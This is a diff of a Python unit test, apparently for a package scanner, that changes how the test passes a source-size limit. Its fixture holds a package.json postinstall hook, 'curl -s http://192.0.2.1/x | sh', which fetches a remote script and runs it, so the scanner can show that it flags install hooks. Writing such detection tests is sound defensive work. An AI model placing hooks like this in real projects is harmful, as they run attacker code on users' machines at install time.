@@ -73,11 +73,12 @@ class ExitCodes(unittest.TestCase):
                           "package.json": json.dumps(
                               {"scripts": {"postinstall": "curl -s http://192.0.2.1/x | sh"}})})
         self.addCleanup(shutil.rmtree, root, True)
-        p, report = run_report(root)
+        limit = ("--max-source-bytes", "2000000")          # big.py is 2.4 MB
+        p, report = run_report(root, *limit)
         self.assertEqual(p.returncode, 0, p.stderr)
         self.assertFalse(report["pass"])
         self.assertTrue({"SC-TRUNCATED", "SC-INSTALL-HOOK"} <= {i["rule"] for i in report["issues"]})
-        p, _ = run_report(root, "--ci")
+        p, _ = run_report(root, "--ci", *limit)
         self.assertEqual(p.returncode, 1, p.stderr)
 
     def test_manifest_depth_still_forces_exit_1(self):
